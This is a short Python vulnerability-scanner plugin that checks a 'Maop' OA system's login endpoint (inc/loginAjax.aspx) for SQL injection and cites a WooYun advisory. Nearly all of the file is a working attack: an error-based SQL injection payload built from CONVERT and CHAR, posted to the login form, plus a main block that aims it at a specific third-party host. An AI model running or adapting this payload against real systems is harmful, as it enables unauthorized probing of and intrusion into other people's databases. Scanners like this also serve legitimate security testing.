#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Author:tsplay
#Refer:WooYun-2015-0112881
#SerType:OA System Maop SQL-Injection
import re
def assign(service, arg):
    if service == "maopoa":
        return True, arg

def audit(arg):
    uri = "inc/loginAjax.aspx"
    payload = "UserName=test'%20AND%209709=CONVERT(INT,CHAR(113)%2bCHAR(115)%2bCHAR(111)%2bCHAR(100)%2bCHAR(115)%2bCHAR(115)%2bCHAR(115)%2bCHAR(115)) AND 'test'='test&Pwd=test&Os=Windows&Browser=Firefox"
    url = arg + uri
    code, head, body, errcode, _url = curl.curl2(url,post=payload,proxy=('127.0.0.1',8080))
    if code == 200 and 'qsodssss' in body:
        security_hole("SQL-Injection:"+url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('maopoa', 'http://oa.cq.dyxdc.net/')[1])